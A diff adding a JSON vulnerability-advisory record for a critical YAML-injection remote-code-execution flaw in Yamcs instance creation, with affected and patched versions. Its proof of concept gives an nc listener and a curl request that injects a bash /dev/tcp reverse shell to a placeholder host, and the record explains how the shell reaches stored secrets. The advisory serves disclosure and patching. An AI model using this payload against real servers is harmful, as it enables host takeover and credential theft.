@@ -1,0 +1,68 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-08-28T17:23:05Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.yamcs:yamcs-core"
+  },
+  "Advisory": {
+    "DatabaseId": 417785,
+    "Id": "GSA_kwCzR0hTQS03M21mLW0zOXAtd3BtOc4ABl_5",
+    "GhsaId": "GHSA-73mf-m39p-wpm9",
+    "References": [
+      {
+        "Url": "https://github.com/yamcs/yamcs/security/advisories/GHSA-73mf-m39p-wpm9"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/commit/549f295cf8c5496a5e799d6bec2432ef976c82aa"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/commit/7192da1c49bdf5ab1d72e579a47766a7c43e87c8"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/releases/tag/yamcs-5.12.8"
+      },
+      {
+        "Url": "https://github.com/yamcs/yamcs/releases/tag/yamcs-5.13.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-73mf-m39p-wpm9"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-73mf-m39p-wpm9"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-55559"
+      }
+    ],
+    "Description": "### Summary\n\n`templateArgs` sent to `POST /api/instances` (and `PATCH /api/instances/{instance}`) are written into the rendered instance config as raw text, then parsed as YAML and loaded. Yamcs instantiates each `services:` entry by its `class:`, so injecting YAML through a template arg lets you add a `services:` entry for `org.yamcs.ProcessRunner` and run a command on the host. The args aren't escaped for YAML or validated server-side.\n\nNeeds the `CreateInstances` privilege. With no `security.yaml` the `guest` user is `superuser=true` and the API is unauthenticated, so it's reachable without auth, same default exposure as CVE-2026-46562. The 5.12.7 algorithm-edit fix doesn't touch this path.\n\n### Details\n\n`VarStatement` appends arg values with no escaping:\n\n```java\n// yamcs-core/src/main/java/org/yamcs/templating/VarStatement.java:29\nbuf.append(value);\n```\n\nThe only filter, `EscapeFilter`, does HTML escaping (`\u0026 \u003c \u003e ' \"`) and leaves newlines, colons and indentation alone, so `{{ x | escape }}` doesn't help either. `InstancesApi.createInstance` forwards the args without checking them against the declared variables; the `choices` / `required` metadata is only used to render the web form.\n\nRequest to exec:\n`InstancesApi.createInstance` (`http/api/InstancesApi.java:169`, checks `CreateInstances`)\n→ `YamcsServer.createInstance` (`YamcsServer.java:651`, `template.process(templateArgs)`)\n→ rendered config loaded as `YConfiguration`\n→ `YamcsServerInstance` instantiates `services:` by `class:` (`YamcsServerInstance.java:75,88`, via `YObjectLoader`)\n→ `org.yamcs.ProcessRunner` runs `new ProcessBuilder(command).start()` (`ProcessRunner.java:81-82`).\n\n`createInstance` has no field for a class name or raw config, and no other API instantiates an arbitrary class at runtime (`ServicesApi` only starts/stops existing ones), so the template arg is the only way in.\n\nA fix would be to validate `templateArgs` (reject newlines / control characters, enforce the declared `choices` / `required`) and/or escape substituted values for the YAML context.\n\n### PoC\n\nRun the shipped example: `./run-example.sh templates`. It serves `HttpServer` on 8090 with no `security.yaml`, so guest is superuser and the API is unauthenticated. Its `example` template puts `{{ spaceSystem }}` into `name: \"...\"`.\n\nListener:\n\n```\nnc -lvnp 4444\n```\n\nRequest (set `\u003cLHOST\u003e` / `\u003cLPORT\u003e` to the listener):\n\n```bash\ncurl -i -X POST http://\u003ctarget\u003e:8090/api/instances \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"name\": \"pwned\",\n    \"template\": \"example\",\n    \"templateArgs\": {\n      \"spaceSystem\": \"x\\\"\\nservices:\\n  - class: org.yamcs.ProcessRunner\\n    args:\\n      command: [\\\"bash\\\", \\\"-c\\\", \\\"exec 3\u003c\u003e/dev/tcp/\u003cLHOST\u003e/\u003cLPORT\u003e; sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\\\"]\\n#\",\n      \"bar\": \"Option 2\"\n    }\n  }'\n```\n\nReturns 200; the new instance starts the injected ProcessRunner, which connects back to the listener with a shell running as the Yamcs user (`id` shows the service account). The arg closes the `name: \"...\"` quote, adds a top-level `services:` (which overrides the template's `services: []`, last key wins in SnakeYAML), and ends with `#` to comment out the trailing `\"`.\n\nWith `security.yaml` it's the same request with a bearer token. This works for a user whose only privilege is `CreateInstances`: that user gets 403 (`Missing system privilege 'ChangeMissionDatabase'`) on the algorithm-override path but 200 here.\n\n### Impact\n\nCommand execution as the Yamcs service account. That includes reading `secretKey` from `etc/yamcs.yaml` (which lets you mint tokens for any user including a superuser), reading other secrets (LDAP bind, OIDC client secret, TLS keys), and reading or tampering with telemetry and command history for every instance on the box.\n\nIt needs `CreateInstances`, or no auth at all in the default config. On a server that delegates that privilege to operators who shouldn't have a shell, or that runs without `security.yaml`, this is host takeover from the API.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-28T17:23:04Z",
+    "Severity": "CRITICAL",
+    "Summary": "Yamcs vulnerable to Remote Code Execution via instance-template argument YAML injection (createInstance)",
+    "UpdatedAt": "2026-08-28T17:23:05Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.12.8"
+      },
+      "VulnerableVersionRange": "\u003c= 5.12.7"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.13.2"
+      },
+      "VulnerableVersionRange": "\u003e= 5.13.0, \u003c= 5.13.1"
+    }
+  ]
+}
